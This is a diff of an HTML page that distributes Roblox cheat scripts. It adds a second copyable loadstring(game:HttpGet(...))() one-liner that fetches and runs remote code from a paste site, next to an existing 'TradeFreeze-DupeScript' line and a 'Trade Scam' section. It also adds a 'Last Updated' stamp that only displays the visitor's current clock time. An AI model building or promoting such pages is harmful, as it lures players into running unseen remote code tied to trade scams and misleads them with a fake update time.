@@ -1,4 +1,4 @@
- 
+
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -108,6 +108,15 @@ body{
   letter-spacing:1px;
 }
 
+.no-ps-label{
+  font-size:12px;
+  color:#22c55e;
+  margin-bottom:6px;
+  font-weight:bold;
+  text-transform:uppercase;
+  letter-spacing:1px;
+}
+
 textarea{
   width:100%;
   height:85px;
@@ -127,6 +136,18 @@ textarea{
   padding:8px;
   border-radius:8px;
   background:#4fd1ff;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+.copy-instant{
+  margin-top:6px;
+  width:100%;
+  border:none;
+  padding:8px;
+  border-radius:8px;
+  background:#22c55e;
+  color:#fff;
   font-weight:bold;
   cursor:pointer;
 }
@@ -221,6 +242,30 @@ textarea{
   background:#64748b;
   color:#fff;
 }
+
+/* Update Log Styles */
+.update-log{
+  background:#0b1220;
+  border-radius:8px;
+  padding:10px;
+  margin-top:10px;
+  border-left:3px solid #4fd1ff;
+}
+
+.update-log-header{
+  font-size:11px;
+  color:#4fd1ff;
+  font-weight:bold;
+  margin-bottom:5px;
+  text-transform:uppercase;
+  letter-spacing:1px;
+}
+
+.update-time{
+  font-size:12px;
+  color:#94a3b8;
+  font-family:monospace;
+}
 </style>
 </head>
 
@@ -257,11 +302,21 @@ textarea{
       <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/VoidsTradeFreeze-DupeScript/main/SAB.lua.txt"))()</textarea>
       <button class="copy" onclick="copyBrainrot(this)">Copy</button>
     </div>
+    <div class="script-box">
+      <div class="no-ps-label">🌐 Private Server Link Not Required</div>
+      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/pgCPPFtNvmI46SWc/raw"))()</textarea>
+      <button class="copy-instant" onclick="copyInstant(this)">Copy</button>
+    </div>
   </div>
 
   <div class="nav">
     <button class="task switch" onclick="go('blox')">🍎 Trade Scam</button>
     <button class="task switch" onclick="go('other')">⭐ Other Scripts</button>
+  </div>
+
+  <div class="update-log">
+    <div class="update-log-header">🕐 Last Updated</div>
+    <div class="update-time" id="update-brainrot">Loading...</div>
   </div>
 </div>
 
@@ -290,6 +345,11 @@ textarea{
   <div class="nav">
     <button class="task switch" onclick="go('brainrot')">⬅ Brainrot</button>
     <button class="task switch" onclick="go('other')">⭐ Other</button>
+  </div>
+
+  <div class="update-log">
+    <div class="update-log-header">🕐 Last Updated</div>
+    <div class="update-time" id="update-blox">Loading...</div>
   </div>
 </div>
 
@@ -321,6 +381,11 @@ textarea{
   </div>
 
   <button class="task switch" onclick="go('brainrot')">⬅ Back</button>
+
+  <div class="update-log">
+    <div class="update-log-header">🕐 Last Updated</div>
+    <div class="update-time" id="update-other">Loading...</div>
+  </div>
 </div>
 
 <!-- Tutorial Modal -->
@@ -337,6 +402,28 @@ textarea{
 const total={brainrot:6,blox:6,other:3}
 const done={brainrot:0,blox:0,other:0}
 let pendingCopy = null;
+
+// Set update timestamps on load
+function setUpdateTimes(){
+  const now = new Date();
+  const options = { 
+    year: 'numeric', 
+    month: 'short', 
+    day: 'numeric', 
+    hour: '2-digit', 
+    minute: '2-digit', 
+    second: '2-digit',
+    hour12: true 
+  };
+  const timeString = now.toLocaleString('en-US', options);
+  
+  document.getElementById('update-brainrot').textContent = timeString;
+  document.getElementById('update-blox').textContent = timeString;
+  document.getElementById('update-other').textContent = timeString;
+}
+
+// Run on page load
+setUpdateTimes();
 
 function step(p,b,l){
   if(b.dataset.d)return
@@ -364,6 +451,11 @@ function copy(b){
 function copyBrainrot(b){
   pendingCopy = b;
   document.getElementById('tutorialModal').style.display = 'flex';
+}
+
+function copyInstant(b){
+  navigator.clipboard.writeText(b.previousElementSibling.value);
+  alert("Copied! ✅");
 }
 
 function openTutorial(){
